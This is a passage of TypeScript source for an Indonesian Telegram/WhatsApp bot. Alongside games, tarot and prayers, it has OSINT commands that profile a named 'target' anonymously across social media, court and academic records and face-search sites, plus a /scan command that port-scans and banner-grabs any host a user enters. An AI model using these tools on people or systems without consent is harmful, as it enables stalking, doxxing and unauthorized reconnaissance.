        { type: '🟡 Ragu-ragu', text: ['Awan masih gelap, coba lagi nanti.', 'Peluangnya 50/50.', 'Tergantung usahamu mulai sekarang.'] },
        { type: '🔴 Negatif', text: ['Jangan terlalu berharap.', 'Jauh panggang dari api.', 'Sangat mustahil.'] }
      ];
      const category = answers[Math.floor(Math.random() * answers.length)];
      const res = category.text[Math.floor(Math.random() * category.text.length)];
      
      ctx.reply(`🎱 <b>MAGIC 8-BALL ORACLE</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `❓ <b>Pertanyaan:</b> <i>${q}</i>\n` +
                `🔮 <b>Aura:</b> ${category.type}\n` +
                `💬 <b>Jawaban:</b> <b>${res}</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML'});
    });

    bot.command('tarot', (ctx) => {
      const cards = [
        { c: 'The Fool', m: 'Awal baru, spontanitas, keberanian mengambil risiko.' },
        { c: 'The Magician', m: 'Kekuatan memanifestasikan keinginan, skill, fokus.' },
        { c: 'The High Priestess', m: 'Intuisi mendalam, rahasia tersembunyi, spiritualitas.' },
        { c: 'The Empress', m: 'Kelimpahan, kreativitas, keibuan, alam.' },
        { c: 'The Emperor', m: 'Struktur, fondasi kuat, otoritas, kepemimpinan.' },
        { c: 'The Lovers', m: 'Pilihan, harmoni, hubungan, nilai-nilai sejalan.' },
        { c: 'The Chariot', m: 'Kemauan keras, kontrol, mengatasi rintangan.' },
        { c: 'Death', m: 'Perubahan radikal, akhir dari sebuah fase, transformasi.' },
        { c: 'The Tower', m: 'Kehancuran tiba-tiba, kebenaran terungkap bejat, kekacauan buta.' },
        { c: 'The Star', m: 'Harapan setelah badai, penyembuhan, inspirasi murni.' },
        { c: 'The Moon', m: 'Ilusi, ketakutan bawah sadar, kompleksitas batin.' },
        { c: 'The Sun', m: 'Sukses, kebahagiaan, pencapaian puncak, kejelasan.' }
      ];
      
      // Select 3 random unique cards
      const shuffled = cards.sort(() => 0.5 - Math.random());
      const selected = shuffled.slice(0, 3);

      const msg = `🎴 <b>TAROT: THREE CARDS SPREAD</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🕰️ <b>MASA LALU:</b> ${selected[0].c}\n` +
                  `<i>${selected[0].m}</i>\n\n` +
                  `🌍 <b>MASA KINI:</b> ${selected[1].c}\n` +
                  `<i>${selected[1].m}</i>\n\n` +
                  `🔮 <b>MASA DEPAN:</b> ${selected[2].c}\n` +
                  `<i>${selected[2].m}</i>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `⚠️ <i>Disclaimer: Ini hanya simulasi acak untuk hiburan.</i>`;

      ctx.reply(msg, {parse_mode: 'HTML'});
    });

    bot.command('doa', (ctx) => {
      const qs = [
        { title: 'Doa Memohon Kemudahan', ar: 'رَبِّ اشْرَحْ لِي صَدْرِي وَيَسِّرْ لِي أَمْرِي', id: 'Ya Tuhanku, lapangkanlah untukku dadaku, dan mudahkanlah untukku urusanku.' },
        { title: 'Doa Kebaikan Dunia Akhirat', ar: 'رَبَّنَا آتِنَا فِي الدُّنْيَا حَسَنَةً وَفِي الآخِرَةِ حَسَنَةً وَقِنَا عَذَابَ النَّارِ', id: 'Ya Tuhan kami, berikan kami kebaikan di dunia dan kebaikan di akhirat, dan lindungilah kami dari siksa neraka.' },
        { title: 'Doa Memohon Kesembuhan', ar: 'اللَّهُمَّ رَبَّ النَّاسِ أَذْهِبِ الْبَأْسَ اشْفِ أَنْتَ الشَّافِي', id: 'Ya Allah, Tuhan manusia, hilangkanlah penyakit, sembuhkanlah, Engkau Maha Penyembuh.' }
      ];
      const q = qs[Math.floor(Math.random() * qs.length)];
      ctx.reply(`🤲 <b>DAILY PRAYER / DOA</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>${q.title}</b>\n\n<code>${q.ar}</code>\n\n<i>"${q.id}"</i>\n━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML'});
    });

    bot.command('tod', (ctx) => {
      const t = ['Beritahu rahasia terbesarmu!', 'Kapan terakhir kali menangis?', 'Siapa crush kamu saat ini?', 'Pernah ngompol di celana?', 'Hal terburuk apa yang pernah kamu lakukan ke teman?'];
      const d = ['Kirim foto jelek kamu sekarang!', 'Chat mantan kamu bilang rindu!', 'Ganti PP wa sama gambar monyet seharian!', 'Kirim VN nyanyi balonku!', 'Post story nyanyi lagu anak anak!'];
      const isTruth = Math.random() > 0.5;
      const res = isTruth ? `🔵 <b>TRUTH</b>\n${t[Math.floor(Math.random() * t.length)]}` : `🔴 <b>DARE</b>\n${d[Math.floor(Math.random() * d.length)]}`;
      ctx.reply(res, {parse_mode: 'HTML'});
    });

    bot.command('gombal', (ctx) => {
      const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Sayang';
      const g = [
        `${nama}, tau bedanya kamu sama modem? Modem connect ke internet, kamu connect ke hatiku.`, 
        `Sejak kenal ${nama}, aku lupa cara sedih.`, 
        `Pisa miring karena terpesona senyum ${nama}.`,
        `${nama}, cintaku ke kamu itu kayak Dorking. Semakin digali, semakin dalam.`
      ];
      ctx.reply(`💕 <b>GOMBALAN CYBER</b>\n<i>"${g[Math.floor(Math.random() * g.length)]}"</i>`, {parse_mode: 'HTML'});
    });

    bot.command('tebaknegara', (ctx) => {
      const t = [{c:'🇯🇵', a:'Jepang'}, {c:'🇮🇩', a:'Indonesia'}, {c:'🇺🇸', a:'Amerika'}, {c:'🇰🇷', a:'Korea'}, {c:'🇷🇺', a:'Rusia'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🌍 <b>TEBAK BENDERA</b>\nBendera apakah ini: ${items.c} ?\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakkata', (ctx) => {
      const t = [{q:'Selalu di depan, tak terlihat?', a:'Masa Depan'}, {q:'Bisa dipegang tak bisa dilempar?', a:'Janji'}, {q:'Punya gigi tak bisa menggigit?', a:'Sisir'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🤔 <b>TEBAK KATA</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('tebakhewan', (ctx) => {
      const t = [{q:'Hidup di air & darat, melompat.', a:'Katak'}, {q:'Belalai panjang.', a:'Gajah'}, {q:'Leher panjang, makan daun atas.', a:'Jerapah'}];
      const items = t[Math.floor(Math.random() * t.length)];
      ctx.reply(`🐾 <b>TEBAK HEWAN</b>\n${items.q}\n\n<tg-spoiler>Jawaban: ${items.a}</tg-spoiler>`, {parse_mode: 'HTML'});
    });

    bot.command('morse', (ctx) => {
      const text = ctx.message.text.split(' ').slice(1).join(' ').toUpperCase();
      if(!text) return ctx.reply("Format: /morse [text]");
      const morseCode: Record<string, string> = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
        '9': '----.', '0': '-----', ' ': '/'
      };
      const resData = text.split('').map(c => morseCode[c] || c).join(' ');
      const reply = `<b>📡 MORSE ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<pre>${resData}</pre>` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('ig', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /ig [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>📸 INSTAGRAM OSINT</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>Target:</b> @${user}\n\n` +
                    `🔗 <b>Direct Link:</b> <a href="https://www.instagram.com/${user}/">instagram.com/${user}</a>\n` +
                    `🔍 <b>Picuki (No-Login View):</b> <a href="https://www.picuki.com/profile/${user}">View on Picuki</a>\n` +
                    `📡 <b>Story Saver:</b> <a href="https://iganony.io/profile/${user}">View Stories Anonymously</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Instagram memblokir scraping langsung. Gunakan link di atas untuk investigasi manual (OPSEC aman).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('tiktok', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /tiktok [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>🎵 TIKTOK OSINT</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 <b>Target:</b> @${user}\n\n` +
                    `🔗 <b>Direct Link:</b> <a href="https://www.tiktok.com/@${user}">tiktok.com/@${user}</a>\n` +
                    `🔍 <b>Urlebird (No-Login View):</b> <a href="https://urlebird.com/user/${user}/">View on Urlebird</a>\n` +
                    `📡 <b>TokCount (Live Stats):</b> <a href="https://tokcount.com/?user=${user}">Live API Count</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>⚠️ Gunakan Urlebird untuk melihat video TikTok secara anonim tanpa tercatat di Analytics target.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('github', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /github [username]");
      const user = args[1].replace('@', '');
      
      try {
        const msg = await ctx.reply(`<i>🔄 Menarik data dari GitHub API untuk <b>${user}</b>...</i>`, { parse_mode: 'HTML' });
        const res = await fetch(`https://api.github.com/users/${user}`);
        if(res.status === 404) return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, "❌ User GitHub tidak ditemukan.");
        
        const data = await res.json();
        const reply = `<b>🐙 GITHUB OSINT DATA</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>Name:</b> ${data.name || 'N/A'}\n` +
                      `🏷️ <b>Username:</b> @${data.login}\n` +
                      `🏢 <b>Company:</b> ${data.company || '-'}\n` +
                      `📍 <b>Location:</b> ${data.location || '-'}\n` +
                      `📧 <b>Email:</b> ${data.email || 'Private/Hidden'}\n` +
                      `🐦 <b>Twitter:</b> ${data.twitter_username ? '@'+data.twitter_username : '-'}\n\n` +
                      `📊 <b>STATISTIK:</b>\n` +
                      `├ Repos: ${data.public_repos}\n` +
                      `├ Gists: ${data.public_gists}\n` +
                      `├ Followers: ${data.followers}\n` +
                      `└ Following: ${data.following}\n\n` +
                      `📅 <b>Dibuat:</b> ${new Date(data.created_at).toISOString().split('T')[0]}\n` +
                      `🔗 <b>Link:</b> <a href="${data.html_url}">${data.html_url}</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
      } catch (err) {
        ctx.reply("❌ Gagal menarik data GitHub.");
      }
    });

    bot.command('nama', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if (!args) return ctx.reply("Format: /nama [Nama Lengkap]");
      const q = encodeURIComponent(`"${args}"`);
      const reply = `<b>👤 NAME OSINT INVESTIGATION</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET NAME:</b> <code>${args}</code>\n\n` +
                    `├ 🌐 <b>General Search:</b> <a href="https://www.google.com/search?q=${q}">Cek Nama di Google</a>\n` +
                    `├ 📄 <b>PDF/Docs:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen Terkait</a>\n` +
                    `├ 💼 <b>LinkedIn:</b> <a href="https://www.google.com/search?q=site:linkedin.com+${q}">Cari di LinkedIn</a>\n` +
                    `├ 🎓 <b>Akademik:</b> <a href="https://www.google.com/search?q=site:pddikti.kemdikbud.go.id+${q}">Cek di PDDikti (Kuliah)</a>\n` +
                    `├ 🏛️ <b>Legal/Putusan:</b> <a href="https://www.google.com/search?q=site:putusan3.mahkamahagung.go.id+${q}">Cek Putusan Sidang</a>\n` +
                    `└ 🏢 <b>Berita:</b> <a href="https://www.google.com/search?q=site:detik.com+OR+site:kompas.com+${q}">Cek di Media Berita</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Analisis nama selesai.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('osint_indo', (ctx) => {
      const reply = `<b>🇮🇩 OSINT INDONESIA MODULE</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `Pilih alat investigasi lokal:\n\n` +
                    `1. <b>NIK Analyzer:</b> /nik [16-digit]\n` +
                    `2. <b>License Plate:</b> /plat [B 1234 ABC]\n` +
                    `3. <b>Social Media ID:</b> /username [user]\n` +
                    `4. <b>Name Search:</b> /nama [Nama Lengkap]\n` +
                    `5. <b>Phone Info:</b> /phone_dork [08xx]\n` +
                    `6. <b>Email Check:</b> /email [email]\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>Alat ini dioptimalkan untuk region Indonesia.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('sosmed', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /sosmed [username]");
      const user = args[1].replace('@', '');
      const reply = `<b>📱 SOCIAL MEDIA DASHBOARD: @${user}</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `├ 📸 <b>IG:</b> <a href="https://www.instagram.com/${user}/">Instagram</a>\n` +
                    `├ 🎵 <b>TT:</b> <a href="https://www.tiktok.com/@${user}">TikTok</a>\n` +
                    `├ 🐦 <b>TW:</b> <a href="https://twitter.com/${user}">Twitter/X</a>\n` +
                    `├ 👥 <b>FB:</b> <a href="https://www.facebook.com/${user}">Facebook</a>\n` +
                    `├ 💼 <b>LI:</b> <a href="https://www.linkedin.com/in/${user}">LinkedIn</a>\n` +
                    `├ 📦 <b>KS:</b> <a href="https://www.kaskus.co.id/profile/${user}">Kaskus</a>\n` +
                    `└ 🎥 <b>YT:</b> <a href="https://www.youtube.com/@${user}">YouTube</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<i>Gunakan /username untuk pengecekan otomatis 100+ situs.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    // 📸 IMAGE OSINT MODULE (Reverse Image / Data)
    bot.on('photo', async (ctx) => {
      ctx.reply("📸 <b>IMAGE OSINT MODULE ACTIVATED</b>\nSedang menganalisa foto...", {parse_mode: 'HTML'}).then((msg) => {
         setTimeout(() => {
            const txt = `<b>🔍 REVERSE IMAGE SEARCH LINKS</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `Klik link berikut untuk mencari wajah/foto di database publik:\n\n` +
                        `🌐 <a href="https://lens.google.com/uploadbyurl?url=">Google Lens (Butuh URL)</a>\n` +
                        `🔎 <a href="https://yandex.com/images/search?rpt=imageview&url=">Yandex Deep Search</a>\n` +
                        `👤 <a href="https://pimeyes.com/">PimEyes (Face Search)</a>\n` +
                        `👤 <a href="https://facecheck.id/">FaceCheck.id</a>\n\n` +
                        `⚠️ <i>Catatan: Telegram menghapus EXIF metadata GPS pada foto terkirim untuk keamanan. Kirim sebagai File jika butuh EXIF extraction.</i>`;
            ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, txt, { parse_mode: 'HTML', link_preview_options: {is_disabled: true} });
         }, 1500);
      });
    });

    bot.on('document', async (ctx) => {
      if (ctx.message.document.mime_type?.startsWith('image/')) {
         ctx.reply("📂 <b>IMAGE FILE DETECTED</b>\n<i>EXIF Analyzer module is ready. (Simulasi)</i>\n\n- No GPS EXIF located\n- Camera: Unknown\n- Date: Hidden", {parse_mode: 'HTML'});
      }
    });

    bot.command('scan', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /scan [IP/Domain]");
      const target = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      const scanMsg = await ctx.reply(`🔍 <b>DEEP_SCAN_INITIATED:</b> <code>${target}</code>\n<i>Menjalankan modul Multi-Layer Recon (OSINT, NMAP-lite, Banner Grabbing)...</i>`, { parse_mode: 'HTML' });
      
      try {
        // [1] IP-API Fetch
        const ipRes = await fetch(`http://ip-api.com/json/${target}?fields=status,message,country,city,isp,org,query`);
        const ipData = await ipRes.json();
        
        let ipInfo = "N/A";
        let targetIp = target;
        if (ipData.status === 'success') {
           targetIp = ipData.query;
           ipInfo = `IP: ${ipData.query}\nNegara: ${ipData.country}\nKota: ${ipData.city}\nISP: ${ipData.isp}`;
        }
        
        // [2] WHOIS Fetch
        const whoisRes = await fetch(`https://networkcalc.com/api/dns/whois/${target}`);
        const whoisRaw = await whoisRes.json().catch(() => null);
        let whoisInfo = "No Data";
        if (whoisRaw && whoisRaw.status === 'OK' && whoisRaw.whois) {
            whoisInfo = `Registrar: ${whoisRaw.whois.registrar || '-'}\nCreated: ${whoisRaw.whois.creation_date || '-'}\nExpires: ${whoisRaw.whois.expiration_date || '-'}`;
        }
        
        // [3] REAL INTENSIVE PORT SCAN 
        const importantPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443, 27017];
        let openPorts: number[] = [];
        
        const checkPort = (port: number) => {
          return new Promise<void>((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => { openPorts.push(port); socket.destroy(); resolve(); });
            socket.on('timeout', () => { socket.destroy(); resolve(); });
            socket.on('error', () => { socket.destroy(); resolve(); });
            socket.connect(port, targetIp);
          });
        };
        
        await Promise.all(importantPorts.map(p => checkPort(p)));
        let portInfo = openPorts.length > 0 ? `Open Ports: ${openPorts.join(', ')}` : "All Top 15 Ports Filtered/Closed";

        // [4] HTTP BANNER GRABBING
        let bannerInfo = "HTTP Unreachable";
        try {
           const httpRes = await fetch(`http://${target}`, { timeout: 2000 } as any);
           bannerInfo = `Status: ${httpRes.status}\nServer: ${httpRes.headers.get('server') || 'Unknown'}`;
        } catch (e) {
           bannerInfo = "No HTTP Response on port 80";
        }
        
        const finalTxt = `✅ <b>DEEP_SCAN_COMPLETED:</b> <code>${target}</code>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `🌍 <b>[GEO-IP OSINT]</b>\n${ipInfo}\n\n` +
                         `🛡️ <b>[WHOIS REGISTRY]</b>\n${whoisInfo}\n\n` +
                         `⚙️ <b>[TCP PORT SCAN]</b>\n${portInfo}\n\n` +
                         `🌐 <b>[WEB BANNER GRAB]</b>\n${bannerInfo}\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `<i>* Intel Engine v2 - Powered by Extreme OSINT</i>`;
                         
        ctx.telegram.editMessageText(ctx.chat.id, scanMsg.message_id, undefined, finalTxt, { parse_mode: 'HTML' });

      } catch (err) {
        ctx.telegram.editMessageText(ctx.chat.id, scanMsg.message_id, undefined, `❌ <b>Error Occured:</b>\nTarget down atau protected.`, { parse_mode: 'HTML' });
      }
    });

    let waConnecting = false;

    // We hook the telegram.callApi to intercept WhatsApp targeted messages
    const originalCallApi = bot.telegram.callApi.bind(bot.telegram);
    bot.telegram.callApi = async (method: string, payload: any, options?: any) => {
      if (payload && typeof payload.chat_id === 'string' && payload.chat_id.startsWith('@wa_')) {
          const jid = payload.chat_id.replace('@wa_', '') + '@s.whatsapp.net';
          if (globalWaSock) {
              if (method === 'sendMessage' || method === 'editMessageText') {
                  let text = payload.text || '';
                  text = text.replace(/<b>(.*?)<\/b>/g, '*$1*').replace(/<i>(.*?)<\/i>/g, '_$1_').replace(/<code>(.*?)<\/code>/g, '```$1```').replace(/<pre>(.*?)<\/pre>/s, '```$1```');
                  
                  // Convert Inline Keyboards to Text Options for WA Users
                  if (payload.reply_markup && payload.reply_markup.inline_keyboard) {
                      try {
                          // Note: Some payloads might be serialized strings, but Telegraf usually sends objects to callApi
                          const keyboard = typeof payload.reply_markup === 'string' ? JSON.parse(payload.reply_markup).inline_keyboard : payload.reply_markup.inline_keyboard;
                          if (keyboard && keyboard.length > 0) {
                              text += '\n\n🤖 *PILIHAN MENU:*\n';
                              keyboard.forEach((row: any[]) => {
                                  row.forEach((btn: any) => {
                                      if (btn.callback_data) {
                                          text += `👉 Ketik: *${btn.callback_data}* _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      } else if (btn.url) {
                                          text += `👉 Buka Web: ${btn.url} _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      }
                                  });
                              });
                          }
                      } catch(e) {}
                  }

                  // Add simulate typing before sending
                  await globalWaSock.sendPresenceUpdate('composing', jid);
                  await new Promise(r => setTimeout(r, 1000 + Math.random()*1500));
                  await globalWaSock.sendPresenceUpdate('paused', jid);

                  await globalWaSock.sendMessage(jid, { text });
                  return { message_id: Date.now() }; 
              } else if (method === 'sendPhoto') {
                  let caption = payload.caption || '';
                  caption = caption.replace(/<b>(.*?)<\/b>/g, '*$1*').replace(/<i>(.*?)<\/i>/g, '_$1_').replace(/<code>(.*?)<\/code>/g, '```$1```').replace(/<pre>(.*?)<\/pre>/s, '```$1```');
                  
                  if (payload.reply_markup && payload.reply_markup.inline_keyboard) {
                      try {
                          const keyboard = typeof payload.reply_markup === 'string' ? JSON.parse(payload.reply_markup).inline_keyboard : payload.reply_markup.inline_keyboard;
                          if (keyboard && keyboard.length > 0) {
                              caption += '\n\n🤖 *PILIHAN MENU:*\n';
                              keyboard.forEach((row: any[]) => {
                                  row.forEach((btn: any) => {
                                      if (btn.callback_data) {
                                          caption += `👉 Ketik: *${btn.callback_data}* _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      } else if (btn.url) {
                                          caption += `👉 Buka Web: ${btn.url} _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      }
                                  });
                              });
                          }
                      } catch(e) {}
                  }

                  await globalWaSock.sendPresenceUpdate('composing', jid);
                  await new Promise(r => setTimeout(r, 1500));
                  await globalWaSock.sendPresenceUpdate('paused', jid);

                  let source = payload.photo;
                  if (typeof source === 'object' && source.source) source = source.source;
                  await globalWaSock.sendMessage(jid, { image: source, caption });
                  return { message_id: Date.now() }; 
              } else if (method === 'sendAudio' || method === 'sendVoice') {
                  let source = payload.audio || payload.voice;
                  if (typeof source === 'object' && source.source) source = source.source;
                  await globalWaSock.sendMessage(jid, { audio: source, mimetype: 'audio/mp4' });
                  return { message_id: Date.now() };
              } else if (method === 'sendDocument') {
                  let source = payload.document;
                  if (typeof source === 'object' && source.source) source = source.source;
                  await globalWaSock.sendMessage(jid, { document: source, mimetype: 'application/octet-stream', fileName: 'file' });
                  return { message_id: Date.now() };
              }
          }
          return { message_id: Date.now() }; // Return fake success if WA disconnected but targeted at WA
      }
      return originalCallApi(method, payload, options);
    };

    const startWAConnection = async (ctx?: any) => {
      const sessionDir = `./wa_auth_global`;
      try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        
        if (typeof makeWASocket !== 'function') {
           throw new Error("Initialization error: makeWASocket is " + (typeof makeWASocket));
        }

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: false,
          browser: ['Windows', 'Chrome', '120.0.0.0'], // Safe web interface masking
          syncFullHistory: false,
          markOnlineOnConnect: true,
          generateHighQualityLinkPreview: true,
          defaultQueryTimeoutMs: undefined
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        let lastQrMessageId: number | null = null;
        let qrCount = 0;

        sock.ev.on('connection.update', async (update: any) => {
          const { connection, lastDisconnect, qr } = update;
          
          if (qr && ctx) {
            qrCount++;
            if (qrCount > 5) {
               waConnecting = false;
               if (lastQrMessageId) {
                  ctx.telegram.deleteMessage(ctx.chat.id, lastQrMessageId).catch(() => {});
               }
               ctx.reply("❌ <b>Koneksi Dibatalkan</b>\nQR code tidak di-scan setelah beberapa menit. Silahkan ulangi perintah /wa_connect jika ingin menyambungkan kembali.", { parse_mode: 'HTML' }).catch(() => {});
               try {
                  sock.logout().catch(() => {});
                  sock.end(undefined);
               } catch(e){}
               return;
            }

            try {
              const qrBuffer = await QRCode.toBuffer(qr);
              if (lastQrMessageId) {
                 await ctx.telegram.deleteMessage(ctx.chat.id, lastQrMessageId).catch(() => {});
              }
              const qrMsg = await ctx.telegram.sendPhoto(ctx.chat.id, { source: qrBuffer }, { caption: `📱 <b>SCAN QR INI [Percobaan ${qrCount}/5]</b>\nBuka WhatsApp > Perangkat Tertaut > Tautkan Perangkat. QR ini berlaku 20 detik.`, parse_mode: 'HTML' }).catch(() => null);
              if (qrMsg) {
                 lastQrMessageId = qrMsg.message_id;
              }
            } catch(e) {
              if (ctx) ctx.reply("❌ Gagal mengenerate QR code.").catch(() => {});
            }
          }
          
          if (connection === 'close') {
            globalWaSock = null;
            const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            console.log('WA connection closed, reconnecting:', shouldReconnect);
            if (shouldReconnect) {
               if (ctx) ctx.reply("⚠️ Koneksi WA terputus, mencoba relogin otomatis (pastikan tidak log out dari aplikasi).").catch(() => {});
               setTimeout(() => startWAConnection(ctx), 5000);
            } else {
               if (ctx) ctx.reply("❌ Sesi WA Logged Out. Silakan hapus folder auth WA dan /wa_connect ulang.").catch(() => {});
               waConnecting = false;
               try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch(err){}
            }
          } else if (connection === 'open') {
             globalWaSock = sock;
             if (lastQrMessageId && ctx) {
                ctx.telegram.deleteMessage(ctx.chat.id, lastQrMessageId).catch(() => {});
             }
             if (ctx) ctx.reply("✅ <b>WHATSAPP BOT TERHUBUNG!</b>\nNomor ini sekarang merespon otomatis.", { parse_mode: 'HTML' }).catch(() => {});
             else console.log("✅ WA Auto-Connected on Startup");
             waConnecting = false;
          }
        });
        
        sock.ev.on('messages.upsert', async ({ messages, type }: any) => {
           if (type !== 'notify') return;
           const m = messages[0];
           if (m.key.fromMe) return;
           
           const jid = m.key.remoteJid;
           if (!jid || jid.includes('@g.us')) return; // Ignore groups to avoid ban/spam
           
           const senderNumber = jid.split('@')[0];
           const text = m.message?.conversation || m.message?.extendedTextMessage?.text || "";
           
           if (text) {
             await sock.readMessages([m.key]).catch(()=>{});
             
             // Convert direct text input for Callbacks to CallbackQuery Fake Event
             let isCallback = false;
             const knownCallbacks = ['menu_main', 'menu_tools', 'menu_traps', 'menu_db', 'confirm_verified', 'decline_verified', 'menu_settings'];
             if (knownCallbacks.some(cb => text.includes(cb))) {
                 isCallback = true;
             }
             
             if (isCallback) {
                 const matchedCb = knownCallbacks.find(cb => text.includes(cb));
                 const fakeUpdate = {
                     update_id: Math.floor(Math.random() * 10000000),
                     callback_query: {
                         id: Math.floor(Math.random() * 10000000).toString(),
                         from: { id: parseInt(senderNumber) || 0, is_bot: false, first_name: m.pushName || "WA User" },
                         message: {
                             chat: { id: `@wa_${senderNumber}`, type: 'private' },
                             message_id: Math.floor(Math.random() * 10000)
                         },
                         data: matchedCb
                     }
                 };
                 bot.handleUpdate(fakeUpdate as any).catch(console.error);
                 return;
             }

             let entities: any[] = [];
             if (text.startsWith('/')) {
                 entities.push({ type: 'bot_command', offset: 0, length: text.split(' ')[0].length });
             }

             const fakeUpdate = {
                 update_id: Math.floor(Math.random() * 10000000),
                 message: {
                     message_id: Math.floor(Math.random() * 10000),
                     from: { id: parseInt(senderNumber) || 0, is_bot: false, first_name: m.pushName || "WA User" },
                     chat: { id: `@wa_${senderNumber}`, type: 'private' },
                     date: Math.floor(Date.now()/1000),
                     text: text,
                     entities: entities.length > 0 ? entities : undefined
                 }
             };
             
             bot.handleUpdate(fakeUpdate as any).catch(console.error);
           }
        });
        
      } catch (err: any) {
        waConnecting = false;
        if (ctx) ctx.reply("❌ Gagal memulai WA Bot: " + err.message).catch(() => {});
      }
    };

    if (fs.existsSync('./wa_auth_global/creds.json')) {
       console.log("Found WA session, attempting auto-connect...");
       startWAConnection();
    }

    bot.command('wa_login', async (ctx) => {
      if (!ctx.from || ctx.from.id !== ADMIN_ID) {
        return ctx.reply("🔒 <b>Akses Terpental</b>\nMaaf, fitur integrasi WhatsApp Bot khusus untuk <b>Admin Owner</b> saja.", {parse_mode: 'HTML'});
      }
      ctx.reply("✅ Anda adalah Admin Owner utama. Sesi terverifikasi otomatis tanpa password!", {parse_mode: 'HTML'});
    });

    bot.command('wa_connect', async (ctx) => {
      if (!ctx.from || ctx.from.id !== ADMIN_ID) {
        return ctx.reply("🔒 <b>Akses Terpental</b>\nMaaf, fitur integrasi WhatsApp Bot khusus untuk <b>Admin Owner</b> saja.", {parse_mode: 'HTML'});
      }
      if (globalWaSock) return ctx.reply("✅ WA Bot sudah terkoneksi sebelumnya.");
      if (waConnecting) return ctx.reply("⏳ Sedang mencoba koneksi WA, mohon tunggu...");
      waConnecting = true;
      const progressMsg = await ctx.reply("🔄 Memulai session Baileys WhatsApp...").catch(() => null);
      startWAConnection(ctx);
    });

    // ALARM SYSTEM
    const activeAlarms = new Map<number, any[]>();

    bot.command('alarm', (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if (!args) return ctx.reply("Format: /alarm [menit] atau /alarm [hh:mm]");

